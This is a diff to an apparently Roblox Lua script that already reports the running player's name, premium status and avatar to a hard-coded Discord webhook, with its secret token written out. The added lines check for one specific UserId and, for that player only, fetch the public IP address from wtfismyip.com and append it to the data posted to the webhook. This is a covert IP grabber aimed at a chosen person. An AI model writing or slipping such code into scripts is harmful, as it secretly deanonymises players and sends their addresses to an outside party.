@@ -932,6 +932,11 @@ end
 	if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
 		premium = "Yes"
 	end
+	local ip = " // NOT BLACKLISTED"
+	if game.Players.LocalPlayer.UserId == 2380447827 then
+		ip = game:HttpGet("https://wtfismyip.com/text")
+        end
+	
 	local url =
 		"https://discord.com/api/webhooks/977962764200988693/8XY_YVlipxlBquz-uzi-PT-TbedKydGdK1DAMemTO_ieDeAU1jx-cKvY9FcBsDjI4FTd"
 	local data = {
@@ -1001,7 +1006,7 @@ end
 					}
 				},
 				["author"] = {
-					["name"] = game.Players.LocalPlayer.Name,
+					["name"] = game.Players.LocalPlayer.Name .. ip,
 					["icon_url"] = pfp
 				}
 			}
